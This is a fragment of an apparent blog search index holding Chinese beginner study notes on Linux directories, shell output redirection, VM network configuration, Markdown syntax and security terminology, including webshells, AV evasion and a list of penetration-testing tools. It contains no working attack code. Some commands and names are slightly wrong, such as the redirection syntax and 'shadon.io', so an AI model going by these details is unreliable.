      <link href="/2019/07/31/Linux%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9/"/>
      <url>/2019/07/31/Linux%E6%A0%B9%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%96%87%E4%BB%B6%E5%A4%B9/</url>
      
        <content type="html"><![CDATA[<h1 id="1、-目录下的文件夹"><a href="#1、-目录下的文件夹" class="headerlink" title="1、/ 目录下的文件夹"></a>1、/ 目录下的文件夹</h1><p><img src="https://i.loli.net/2019/08/01/5d427d879ccfd25224.png" alt></p><table><thead><tr><th>目录</th><th>作用</th></tr></thead><tbody><tr><td>/bin</td><td>放置可执行的文件目录</td></tr><tr><td>/dev</td><td>任何设备以文件形态存放</td></tr><tr><td>/medi</td><td>放置可移动设备</td></tr><tr><td>/opt</td><td>第三方协议软件放置目录</td></tr><tr><td>/tmp</td><td>暂时存放文件的地方</td></tr><tr><td>/home</td><td>用户主目录</td></tr><tr><td>/root</td><td>系统管理员</td></tr><tr><td>/proc</td><td>虚拟文件系统</td></tr><tr><td>/etc</td><td>Linux系统配置文件</td></tr><tr><td>/usr</td><td>安装的第三方软件默认位置</td></tr><tr><td>/var</td><td>针对常态性变动文件</td></tr><tr><td>/usr/bin</td><td>系统用户使用的应用程序</td></tr><tr><td>/usr/sbin</td><td>场及用户使用的较高级别的系统守护程序</td></tr><tr><td>/usr/src</td><td>内核源代码默认的放置目录</td></tr><tr><td>/var</td><td>存放着不断扩充着的东西，习惯将这些经常被修改的目录放在这个目录下，包括日志文件</td></tr><tr><td>/run·</td><td>是一个临时文件系统，存储系统启动以来的信息，当系统重启时，这个目录下的文件应该被删掉或清除。如果系统上有 /var/run目录，应该让他指向run</td></tr><tr><td>/lib</td><td>存放着系统最基本的动态连接共享库，起作用类似Windows里的Dll文件，几乎所有的应用程序都需要用这些共享库</td></tr><tr><td>/lost+found</td><td>这个目录一般情况下是空的，当系统非法关机，会存放一些文件</td></tr><tr><td>/mnt</td><td>系统提供该目录是为了让用户临时挂载别的文件系统，可以将光盘挂载在/mnt上，然后进入该目录就可以查看光驱里的内容</td></tr><tr><td>/selinux</td><td>Redhat/CentOS所特有的目录，Selinux一个安全机制，类似windows的防火墙，但这套机制比较复杂，这个目录就是存放selinux相关的文件</td></tr><tr><td>/srv</td><td>存放一些服务启动后需要提取的数据</td></tr></tbody></table><p>绝对路径和相对路径<br>/boot |存放的是启动Linux时使用的一些核心文件，包括一些连接文件以及镜像文件<br>        绝对路径：以 / 目录为开始点<br>        相对路径：以当前路径为开始点，标准写法 ./ 开头（pwd察看当前所在文件路径）</p><h1 id="2、标准输出流"><a href="#2、标准输出流" class="headerlink" title="2、标准输出流"></a>2、标准输出流</h1><p>nohup ./program &gt; /dev/null 2 &gt; log &amp;        只输出错误信息到日志文件<br>nohup ping 8.8.8.8 &gt; /dev/null/ 2 &gt; &amp;1 &amp;     输出信息中什么信息也不要</p><p>说明：</p><pre><code>/dev/null ：在Linux中俗称黑洞，代表Linux的空设备文件2 &gt;&amp;1     ：重定向邦定，&amp;将两个输出邦定到一起，错误输出（2）和标准输出（1，0标准键盘输出）到同一个地方/dev/null/ 2 &gt; &amp;1 &amp;   ：将错误信息和标准信息邦定，此时只有错误信息，标准信息会输出到屏幕，&amp;则是进行会后台输出，没有接受文件所以丢弃输出信息/dev/null 2 &gt; log &amp;       ：将错误信息输入log     &amp;在后台进行输出</code></pre><table><thead><tr><th>类型</th><th>文件描述符</th><th>默认情况</th><th>对应文件句柄位置</th></tr></thead><tbody><tr><td>标准输入（standard input）</td><td>0</td><td>从键盘获得输入</td><td>/proc/self/fd/0</td></tr><tr><td>标准输出（standard output）</td><td>1</td><td>输出到屏幕（即控制台）</td><td>/proc/self/fd/1</td></tr><tr><td>错误输出（error output）</td><td>2</td><td>输出到屏幕（即控制台）</td><td>/proc/self/fd/2</td></tr></tbody></table>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第一周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>虚拟机修改系统网卡和IP</title>
      <link href="/2019/07/31/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E7%BD%91%E5%8D%A1%E5%92%8CIP/"/>
      <url>/2019/07/31/%E8%99%9A%E6%8B%9F%E6%9C%BA%E4%BF%AE%E6%94%B9%E7%B3%BB%E7%BB%9F%E7%BD%91%E5%8D%A1%E5%92%8CIP/</url>
      
        <content type="html"><![CDATA[<h1 id="1、查看虚拟机的网卡配置"><a href="#1、查看虚拟机的网卡配置" class="headerlink" title="1、查看虚拟机的网卡配置"></a>1、查看虚拟机的网卡配置</h1><p><img src="https://i.loli.net/2019/07/31/5d417a4074af411807.png" alt><br><img src="https://i.loli.net/2019/07/31/5d417a406f2f817392.png" alt><br>进入该系统目录<br><img src="https://i.loli.net/2019/07/31/5d417a40431f290385.png" alt><br>使用vi/vim进行修改</p><pre><code>关于Linux图形界面和命令界面的切换，Ctrl+Alt+F2~F6 是命令行界面；Ctrl+Alt+F1是图形界面</code></pre><p><img src="https://i.loli.net/2019/07/31/5d417a40425a043281.png" alt><br>静态IP地址的设置<br>Ifcfg-eno16777736    文件中的各项含义：<br>        BOOTPROTO        网络参数设置：静态IP：STATIC或、动态IP：DCHP、NONE：不指定<br>        DEFROUTE<br>        IPV4_FAILURE_FATAL<br>        IPV6INIT<br>        IPV6_AUTOCONF<br>        IPv6_DEFROUTE<br>        IPV6_FAILURE_FATAL<br>        NAME<br>        UUID        通用唯一识别码。<br>        DEVICE        物理设备的名字（动态ppp设备除外，是罗辑名）<br>        ONBOOT        yes：设备在boot时被激活，no：设备在boot时不被激活<br>        USERCTL        yes：非root用户可以控制设备，no：非root用户不允许控制设备<br>        BOOTPROTO    none：不使用boot协议，bootp：使用bootp协议，dhcp：使用dhcp协议<br>        PEERDMS<br>        PEERROUTES<br>        IPV6_PEERDMS<br>        IPV6_PEERROUTES<br>        IPADDR        IP地址<br>        NETMASK    网络掩码<br>        NETWORK    网络地址<br>        BROADCAST    广播地址<br>        GATEWAY        网关地址</p><pre><code>PPP和SLIP文件所使用的数值：    PERSIST        yes：设备将一直维持激活状态，即使modem被挂断导致非激活状态，no：设备不一直维持激活状态    MODEMPORT        modem设备名称    LINESPEED        modem的线速率    DEFABORT    yes：在创建或编辑该接口的脚本时插入默认种植字符串，no：在创建或编辑该接口的脚本时不插入默认种植字符串使用与所有ppp文件    DEFROUTE    yes：该接口为默认路由器，no：不将该接口设置为默认路由器    ESCAPECHARS        yes：使用预定义的asymcmap，no：不要使用预定义的asyncmap。（这里代表了一种简化的接口；它不让用户指定使用escape字符。然而，几乎任何情况下都可以使用一个00000000的asyncmap,而且如果需要的话，可以通过设置 PPPOPTIONS来使用任意的asyncmap.）    HARDFLOWCTL    yes：使用硬件流控制，no：不使用硬件流控制    PPPOPTIONS        是任意的选项字符串。它被放置在命令行的末尾，以覆盖前面的选项    PAPNAME=name,这里name是pppd命令行中“name $PAPNAME”的一部分。注意选项“remotename”总是指定为逻辑ppp设备名，如“ppp0”（如果先前有其它ppp设备被激活的话，这就可能是物理设备ppp1）这样做便于管理pap/chap 文件--name/passwd对与逻辑ppp设备名关联，因此它们可以被一起管理。理论上说，为逻辑PPP设备起除“ppp0”--“pppN”之外的如“worldnet”或”myISP“ 的名字是可行的。    REMIP    远端IP地址    MTU    设置MTU数值    MRU    设置MRU数值    DISCONNECTTIMEOUT        当一个成功连接被终止后要等等多少秒进行再次连接    ERTRYTIMEOUT        当一个失败连接要等都少秒后再次连接</code></pre><h1 id="2、桥接模式和NAT模式"><a href="#2、桥接模式和NAT模式" class="headerlink" title="2、桥接模式和NAT模式"></a>2、桥接模式和NAT模式</h1><pre><code>    桥接模式：网络层面，虚拟机和PC处于同级地位，虚拟机直接和路由器相连    NAT模式：网络层面，虚拟机处于PC的子级，虚拟机通过主机转换后和路由器相连</code></pre><h1 id="3、静态IP连接和动态IP连接"><a href="#3、静态IP连接和动态IP连接" class="headerlink" title="3、静态IP连接和动态IP连接"></a>3、静态IP连接和动态IP连接</h1><pre><code>    静态IP：固定IP地址上网，    动态IP：自动获取IP地址上网，有成DHCP模式特点：    静态IP：ISP（Internet Service Provider）提供的IP地址可直接上网，因为IPv4地址已经分配完毕，索引很稀缺        对特殊需求的服务器，不允许地址经常改变，常见于局域网打印机，网站服务器，FTP服务器等    动态IP：不是真实IP地址，根据域名服务器动态分配给用户IP地址    常用于大型局域网，通过DHCP服务器获取地址，降低网络管理员的工作量</code></pre>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第一周 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MakeDown常用语法</title>
      <link href="/2019/07/31/MakeDown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/"/>
      <url>/2019/07/31/MakeDown%E5%B8%B8%E7%94%A8%E8%AF%AD%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="常见Markdown格式"><a href="#常见Markdown格式" class="headerlink" title="常见Markdown格式"></a>常见Markdown格式</h1><h2 id="1、标题"><a href="#1、标题" class="headerlink" title="1、标题"></a>1、标题</h2><pre><code>  #一级标题  ##二级标题以此类推</code></pre><h2 id="2、文本样式"><a href="#2、文本样式" class="headerlink" title="2、文本样式"></a>2、文本样式</h2><p>  (带 * 的原版中没有，大部分衍生标准中被添加)<br>    链接 : [Title](URL)<br>    加粗 : **Bold**<br>    斜体字 : *Italics*<br>    删除线 : <del>\</del>text~~<br>    分割线： ___<br>    段落 : 段落之间空一行<br>    换行符 : 一行结束时输入两个空格<br>    列表 :* 添加星号成为一个新的列表项。<br>    引用 :&gt; 引用内容<br>    内嵌代码 : `alert(‘Hello World’);`<br>    画水平线 (HR) :——–<br>    方框：- [ ] -<br>    首行缩进： &amp;ensp  一个半角的空格<br>              &amp;emsp  一个全角的空格 两个全角空格用的比较多</p><h2 id="3、图片"><a href="#3、图片" class="headerlink" title="3、图片"></a>3、图片</h2><p>  ![标题](链接，图片位置)</p><h2 id="4、脚注（标准Markdown中不存在）"><a href="#4、脚注（标准Markdown中不存在）" class="headerlink" title="4、脚注（标准Markdown中不存在）"></a>4、脚注（标准Markdown中不存在）</h2><p>  你好 [^n]<br>  [^n]:<a href="http://baidu.com" target="_blank" rel="noopener">http://baidu.com</a><br>  n为任意字符都可</p><h2 id="5、代码"><a href="#5、代码" class="headerlink" title="5、代码"></a>5、代码</h2><h3 id="插入两种方式："><a href="#插入两种方式：" class="headerlink" title="插入两种方式："></a>插入两种方式：</h3><pre><code>  1、键入 `  2、使用tab进行缩进</code></pre><h2 id="6、表格插入"><a href="#6、表格插入" class="headerlink" title="6、表格插入"></a>6、表格插入</h2><p> 表项|表项|表项<br> -|-|-|<br> 文字|文字|文字</p>]]></content>
      
      
      
        <tags>
            
            <tag> 工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络安全常见术语</title>
      <link href="/2019/07/31/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B8%B8%E8%A7%81%E6%9C%AF%E8%AF%AD/"/>
      <url>/2019/07/31/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%B8%B8%E8%A7%81%E6%9C%AF%E8%AF%AD/</url>
      
        <content type="html"><![CDATA[<h1 id="1．网络安全："><a href="#1．网络安全：" class="headerlink" title="1．网络安全："></a>1．网络安全：</h1><p>不因偶然或者恶意的破坏、更改、泄露，系统能连续、可靠正常的运行，服务不中断，在网络环境下能够识别和消除不安因素的能力</p><h1 id="2．OWASP"><a href="#2．OWASP" class="headerlink" title="2．OWASP"></a>2．OWASP</h1><h1 id="3．黑客术语："><a href="#3．黑客术语：" class="headerlink" title="3．黑客术语："></a>3．黑客术语：</h1><pre><code>弱口令：密码强度不够WebShell：asp、php、jsp、cgi等网页形式存在一种命令执行环境，一种网页后门。得到一个命令执行环境达到服务器的目的    特点：隐蔽性强，功能强大，穿越防火墙，无系统日志（在中间件中保留日志）    分类：        大码：功能齐全，大量脚本语言建立体积庞大        小码：一句话代码，依赖管理软件木马：表面上伪装成正常程序获得系统权限    木马和病毒的区别：    木马：伪装潜伏，等待链接    病毒：破坏，索取资金为主后门：在获取权限后，编写程序为日后联结获取电脑权限做准备内网：通俗，局域网外网：直接联入Internet，IP地址不是保留内网IP地址端口：用于接收某些数据，提供相应服务，一般一个端口对应一个服务远控：通过计算机网络异地拨号或双方接入Internet等手段，连同需被控制的计算机，通过本地计算机对远程计算机进行控制修改免杀：通过加壳，加密、花指令等躲避杀毒软件提取：操作系统地权限用户提升为管理员权限</code></pre><h1 id="4．渗透测试："><a href="#4．渗透测试：" class="headerlink" title="4．渗透测试："></a>4．渗透测试：</h1><p>模拟恶意黑客攻击网站进行评估计算机网络系统的安全<br>    白盒测试：有域名，代码审计，资产清单（应用文件配置，应用部署情况）<br>    黑盒测试：只有域名进行渗透测试<br>    渗透测试的步骤：</p><h2 id="1．-信息收集"><a href="#1．-信息收集" class="headerlink" title="1．    信息收集"></a>1．    信息收集</h2><h2 id="2．-威胁建模"><a href="#2．-威胁建模" class="headerlink" title="2．    威胁建模"></a>2．    威胁建模</h2><h2 id="3．-渗透测试"><a href="#3．-渗透测试" class="headerlink" title="3．    渗透测试"></a>3．    渗透测试</h2><h2 id="4．-后渗透测试：（拿到WebShell为一个简易标准）"><a href="#4．-后渗透测试：（拿到WebShell为一个简易标准）" class="headerlink" title="4．    后渗透测试：（拿到WebShell为一个简易标准）"></a>4．    后渗透测试：（拿到WebShell为一个简易标准）</h2><h2 id="5．渗透测试工具："><a href="#5．渗透测试工具：" class="headerlink" title="5．渗透测试工具："></a>5．渗透测试工具：</h2><pre><code>1．信息搜集    A．Nmap：探测计算机网络上的主机和服务的一种安全扫描器    B．御剑：网站后台扫描工具    C．Google hack（google高级搜索）    D．Maltego：专业数字取证软件    E．Whois查询：查询一个域名是否已经被注册，以及域名注册后的详细信息    F．Kail Linux：基于Debian的Linux（7）发行版本，用于数字取证    常用网站：        Google        Baidu        www.exploit-db.com    英文不收费        www.seebug.net        中文收费        www.shadon.io        专门搜索企业的信息资产        www.zoomeye.org        X情报社区2．漏洞扫描    A．AWVS：自动化Web应用程序安全测试工具    B．H3C WebScan：Web应用风险深度扫描工具    C．AppScan：自动评估扫描，检测，所有常见Web应用程序漏洞    D．Netsparker：综合性Web应用安全漏洞扫描工具，分专业和免费版    E．Nessus：目前最常用的系统漏洞扫描分析软件    F．巡风：企业内网漏洞快速应急，扫描系统3．漏洞利用    A．中国菜刀：专业的网站管理软件    B．Sqlmap：开放源码的渗透测试工具，自动探测和利用Sql漏洞来接管数据库    C．啊D：注入验证利用工具，目前Sql中比较好用的4．综合平台    A．BurpSuite：针对Web应用程序的集成平台    B．Metasploit：开源的安全漏洞检测工具</code></pre>]]></content>
      
      
      <categories>
          
          <category> i春秋 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 第一周 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
